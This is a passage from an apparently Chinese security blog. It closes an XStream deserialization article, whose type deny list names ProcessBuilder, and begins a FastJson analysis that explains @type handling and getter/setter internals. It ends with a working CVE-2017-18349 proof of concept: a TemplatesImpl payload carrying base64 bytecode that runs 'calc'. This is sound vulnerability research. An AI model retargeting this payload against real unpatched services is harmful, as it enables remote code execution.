<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setupSecurity</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.securityMapper != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="built_in">this</span>.denyTypes(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>&#125;);</span><br><span class="line">        <span class="built_in">this</span>.denyTypesByRegExp(<span class="keyword">new</span> <span class="title class_">Pattern</span>[]&#123;LAZY_ITERATORS, JAVAX_CRYPTO, JAXWS_FILE_STREAM&#125;);</span><br><span class="line">        <span class="built_in">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="built_in">this</span>.securityInitialized = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析 (seebug.org)</a><br><a href="https://www.cnblogs.com/nice0e3/p/15046895.html">Java安全之XStream 漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">XStream反序列化 (y4tacker.github.io)</a><br><a href="https://x-stream.github.io/javadoc/index.html">Overview (XStream Core 1.4.20 API) (x-stream.github.io)</a><br><a href="https://x-stream.github.io/tutorial.html">XStream - Two Minute Tutorial (x-stream.github.io)</a><br><a href="https://xz.aliyun.com/t/11372">XSteam历史漏洞分析</a><br><a href="https://www.cnblogs.com/escape-w/p/16107046.html">Xstream反序列化漏洞研究笔记 - Escape-w - 博客园 (cnblogs.com)</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/12784">https://xz.aliyun.com/t/12784</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之FastJson漏洞分析与利用</title>
    <url>/2023/02/10/fastjson-security/</url>
    <content><![CDATA[<h1 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h1><p>fastjson是一个阿里巴巴的开源库，用于对JSON格式的数据进行解析和打包</p>
<h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><p>Maven项目添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果出现<code>com.alibaba:fastjson:pom:1.2.58 failed to transfer from</code>等错误，在pom.xml中添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>maven-ali<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/nexus/content/repositories/central<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">updatePolicy</span>&gt;</span>always<span class="tag">&lt;/<span class="name">updatePolicy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">checksumPolicy</span>&gt;</span>fail<span class="tag">&lt;/<span class="name">checksumPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://developer.aliyun.com/mvn/guide">仓库服务 (aliyun.com)</a></p>
<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><strong>构建Person和Person1类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Person1类：(在声明成员变量时不一致，其他都是一致的)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JSONField(name = &quot;user_name&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="meta">@JSONField(name = &quot;user_age&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;</span><br></pre></td></tr></table></figure>

<p><strong>测试代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 将Java对象序列化成JSON字符串</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;mike&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">personString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(personString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将Json字符串反序列化成Java对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;lucy\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> JSON.parseObject(str, Person.class);</span><br><span class="line">        System.out.println(person1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将Json字符串反序列化成Java对象   使用注解映射</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;user_name\&quot;:\&quot;YYY\&quot;, \&quot;user_age\&quot;:18&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person1</span> <span class="variable">person11</span> <span class="operator">=</span> JSON.parseObject(str1, Person1.class);</span><br><span class="line">        System.out.println(person11.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行结果：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;mike&quot;</span>&#125;</span><br><span class="line">Person&#123;name=<span class="string">&#x27;lucy&#x27;</span>, age=<span class="number">18</span>&#125;</span><br><span class="line">Person&#123;name=<span class="string">&#x27;YYY&#x27;</span>, age=<span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>结果分析：</strong></p>
<p>在Java对象序列化成字符串的过程中，输出的结果age在name之前：在<code>fastjson</code>中，默认情况下，生成的<code>JSON</code>字符串的顺序是按照<strong>属性的字母顺序</strong>进行，而不是按照属性在类中的声明顺序。</p>
<h2 id="type使用"><a href="#type使用" class="headerlink" title="@type使用"></a>@type使用</h2><p><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;java.lang&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fastjson在1.2.24之后默认禁用Autotype，因此这里我们通过<code>ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</code>来开启，否则会报错<code>autoType is not support</code></strong></p>
<h2 id="反序列化函数的区别"><a href="#反序列化函数的区别" class="headerlink" title="反序列化函数的区别"></a>反序列化函数的区别</h2><p>在字符串反序列化成对象时存在3个方法，分别如下：</p>
<ul>
<li>parseObject(Stringtext) </li>
<li>parse (Stringtext)</li>
<li>parseObject(String text, Class<T> clazz)</li>
</ul>
<p><strong>知识点一</strong></p>
<p>使用方法2或3解析json字符串，程序最终都会走到<code>com/alibaba/fastjson/util/JavaBeanInfo</code>的bulid方法，其调用链如下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230703153554.png"></p>
<p>两者的调用链是完全一样的，不同点在于build方法中传入的classz来源不一致：</p>
<ul>
<li><p>parse (Stringtext)：传入的clazz参数获取于json字符串中@type字段的值</p>
<p>获取的相关代码在<code>com/alibaba/fastjson/parser/DefaultJSONParser</code>的parseObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>parseObject(String text, Class<T> clazz)：传入的classz参数获取于第二个参数</p>
</li>
</ul>
<p><strong>知识点二</strong></p>
<p>在<code>com/alibaba/fastjson/util/JavaBeanInfo</code>的bulid方法中会对传入的json字符串进行解析，会创建一个filedList数组来存放后续将要处理的目标类的setter方法及某些特定条件下的getter方法</p>
<p><strong>getter方法收集条件：</strong></p>
<ul>
<li><p>方法名长度需要大于4</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不是静态方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法名以get开头并且第四个字母是大写字母</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)))</span><br></pre></td></tr></table></figure>
</li>
<li><p>无参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">    || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">    || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">   )</span><br></pre></td></tr></table></figure>
</li>
<li><p>此getter不能有setter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> getField(fieldList, propertyName);</span><br><span class="line"><span class="keyword">if</span> (fieldInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>知识点三</strong></p>
<p>parseObject(Stringtext) 方法与其他两个方法不同，它先执行了parse方法，然后通过JSON.toJSON转换成了JSONObject对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在JSON.toJSON中调用了javaBeanSerializer.getFieldValuesMap方法记录了所有的getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;</span><br><span class="line">        json.put(entry.getKey(), toJSON(entry.getValue()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getFieldValuesMap</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;(sortedGetters.length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (FieldSerializer getter : sortedGetters) &#123;</span><br><span class="line">        map.put(getter.fieldInfo.name, getter.getPropertyValue(object));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后在FieldInfo的get方法中通过反射调用了所有的getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object javaObject)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> method.invoke(javaObject, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> field.get(javaObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/5b39572eea2423ba7890b99cf0b88a05.png"></p>
<p><strong>知识点四</strong></p>
<p><strong>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数</strong></p>
<p><strong>Fastjson默认只会反序列化public修饰的属性</strong></p>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/190885048">Fastjson 1.2.24反序列化漏洞深度分析 - 知乎 (zhihu.com)</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="lt-x3D-fastjson1-2-24-CVE-2017-18349"><a href="#lt-x3D-fastjson1-2-24-CVE-2017-18349" class="headerlink" title="&lt;&#x3D;fastjson1.2.24(CVE-2017-18349)"></a>&lt;&#x3D;fastjson1.2.24(CVE-2017-18349)</h2><p><strong>fastjson&lt;&#x3D;1.2.24 反序列化漏洞</strong>，JDK版本无限制</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>Maven依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CveTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中_bytecodes中的内容是下面内容编译成class文件后进行base64编码后得到的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用链：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

